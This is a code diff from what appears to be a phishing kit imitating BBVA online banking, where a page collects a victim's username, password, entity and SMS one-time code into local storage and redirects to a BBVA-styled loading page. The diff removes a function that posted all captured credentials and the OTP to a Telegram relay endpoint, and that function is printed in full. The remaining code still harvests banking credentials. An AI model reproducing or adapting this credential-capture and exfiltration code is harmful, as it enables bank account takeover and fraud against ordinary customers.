@@ -173,35 +173,6 @@
                 return value ? JSON.parse(value) : '--';
             }
 
-            async function enviarATelegram() {
-                const allData = {};
-                const fields = ['usuario', 'clave', 'ente', 'codsms', 'status', 'uniqid'];
-
-                fields.forEach(field => {
-                    allData[field] = getFromLocalStorage(field);
-                });
-
-                console.log('Datos a enviar a Telegram:', allData);
-
-                try {
-                    const response = await fetch('/api/telegram/send', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            uniqid: appState.uniqId,
-                            data: allData
-                        })
-                    });
-                    const result = await response.json();
-                    console.log('Datos enviados a Telegram:', result);
-                } catch (e) {
-                    console.error('Error al enviar a Telegram:', e);
-                }
-            }
-
             function validateOtp() {
                 const value = $('#codsmsInput').val().trim();
                 const isValid = /^\d{6,8}$/.test(value);
@@ -210,12 +181,11 @@
             }
 
             $('#codsmsInput').on('input', validateOtp);
-            $('#btnCodSMS').on('click', async function () {
+            $('#btnCodSMS').on('click', function () {
                 if (validateOtp()) {
                     saveToLocalStorage('codsms', $('#codsmsInput').val().trim());
                     saveToLocalStorage('status', 'CODSMS');
 
-                    await enviarATelegram();
                     window.location.href = '/bbva/loading';
                 }
             });
